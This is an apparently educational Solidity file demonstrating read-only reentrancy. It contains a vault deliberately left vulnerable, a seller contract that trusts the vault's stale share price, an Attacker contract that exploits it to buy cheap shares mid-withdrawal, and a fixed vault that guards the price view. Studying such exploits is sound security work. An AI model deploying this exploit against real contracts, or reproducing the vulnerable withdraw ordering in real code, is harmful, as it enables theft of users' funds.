// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 s) external;
    function shares(address) external view returns (uint256);
    function transferShares(address to, uint256 amt) external;
    function pricePerShare() external view returns (uint256);
}

contract Vault {
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    bool internal _lock;
    modifier nonReentrant() { require(!_lock, "reentrant"); _lock = true; _; _lock = false; }

    function deposit() external payable {
        uint256 s = totalShares == 0 ? msg.value
            : msg.value * totalShares / (address(this).balance - msg.value);
        shares[msg.sender] += s; totalShares += s;
    }
    function withdraw(uint256 s) external nonReentrant {
        uint256 eth = s * address(this).balance / totalShares; // price BEFORE state update
        shares[msg.sender] -= s;
        (bool ok, ) = msg.sender.call{value: eth}("");         // SEND FIRST -> reentry, balance drops
        require(ok);
        totalShares -= s;                                      // burn AFTER -> view is stale mid-call
    }
    function transferShares(address to, uint256 amt) external { shares[msg.sender] -= amt; shares[to] += amt; }
    function pricePerShare() public view returns (uint256) {   // UNGUARDED -> lies during withdraw
        return totalShares == 0 ? 1e18 : address(this).balance * 1e18 / totalShares;
    }
}

contract Seller {                       // sells its vault shares at the vault's reported price
    IVault vault;
    constructor(IVault v) { vault = v; }
    function buyShares() external payable {
        uint256 price = vault.pricePerShare();          // trusts the vault (read-only reentrancy!)
        uint256 bought = msg.value * 1e18 / price;       // low price -> MORE shares per ETH
        vault.transferShares(msg.sender, bought);
    }
}

contract Attacker {
    IVault vault; Seller seller; bool buying;
    constructor(IVault v, Seller s) { vault = v; seller = s; }
    function pwn() external payable {
        vault.deposit{value: msg.value}();
        buying = true;
        vault.withdraw(vault.shares(address(this)));     // callback buys cheap shares
        vault.withdraw(vault.shares(address(this)));     // redeem them at the true price
    }
    receive() external payable {
        if (buying) { buying = false; seller.buyShares{value: msg.value / 4}(); } // spend 1/4 of the withdrawal
    }
}

contract VaultFixed {
    mapping(address => uint256) public shares;
    uint256 public totalShares;
    bool internal _lock;
    modifier nonReentrant() { require(!_lock, "reentrant"); _lock = true; _; _lock = false; }

    function deposit() external payable {
        uint256 s = totalShares == 0 ? msg.value
            : msg.value * totalShares / (address(this).balance - msg.value);
        shares[msg.sender] += s; totalShares += s;
    }
    function withdraw(uint256 s) external nonReentrant {
        uint256 eth = s * address(this).balance / totalShares;
        shares[msg.sender] -= s;
        (bool ok, ) = msg.sender.call{value: eth}("");
        require(ok);
        totalShares -= s;
    }
    function transferShares(address to, uint256 amt) external { shares[msg.sender] -= amt; shares[to] += amt; }
    function pricePerShare() public view returns (uint256) {
        require(!_lock, "read-only reentrancy");               // THE FIX: view reverts mid-withdraw
        return totalShares == 0 ? 1e18 : address(this).balance * 1e18 / totalShares;
    }
}
